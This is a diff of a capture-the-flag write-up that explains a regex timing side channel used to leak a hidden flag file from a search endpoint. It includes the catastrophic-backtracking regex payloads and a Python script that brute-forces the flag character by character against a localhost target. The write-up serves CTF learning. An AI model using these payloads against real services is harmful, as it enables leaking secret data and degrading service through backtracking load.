@@ -25,7 +25,7 @@ But the file is still added to the list of files which are traversed.
 Which means that we won't be able to find the contents within this file but the system still goes through `flag.txt` everytime a search is made for the contents within it.
 
 Further, we also can observe that, only a file which is set to be visible can be accessed.
-```
+```JS
 app.get('/view/:fileName', (req, res) => {
   const fileName = req.params.fileName;
   const fileData = filesIndex[fileName];
@@ -43,6 +43,7 @@ The regex was made such that, in case the guess is correct, then there is no del
 payload - 
 ` ^guess|^(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)~$ `
 ![image](https://github.com/user-attachments/assets/3ee6bddb-23c8-4057-bc89-d74c33bc3af8)
+
 ![image](https://github.com/user-attachments/assets/a36c929a-115a-45c1-bc06-2c520dba1668)
 As observed, it shows *catastrophic backtracking* when the guess is incorrect and it loads quickly otherwise.
 
@@ -64,6 +65,27 @@ This is because there are many files other than flag.txt which can match regex f
 Hence we need to modify our payload to - 
 ` ^uoftctf{guess}|^uoft(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)~$ `
 since ``uoft`` would not get any match out of the flag.txt file so the catastrophic backtracking won't happen unless the search is done within the flag.txt file.
+
+Hence the final script made to solve the challenge -
+```python
+import requests
+
+url = "http://localhost:32768/search"
+flag = ""
+
+charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}"
+while True:
+  for ch in charset:
+    r = requests.post(url, json={"query":"/^uoftctf\{" + flag + ch + "|^uoft(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)~$/","language":"All"})
+    if(r.elapsed.total_seconds() < 0.8):
+      flag += ch
+      print(flag)
+      break
+    if(ch == '}'):
+      exit()
+```
+[this challenge was solved after the ctf ended]
+
 
 
 
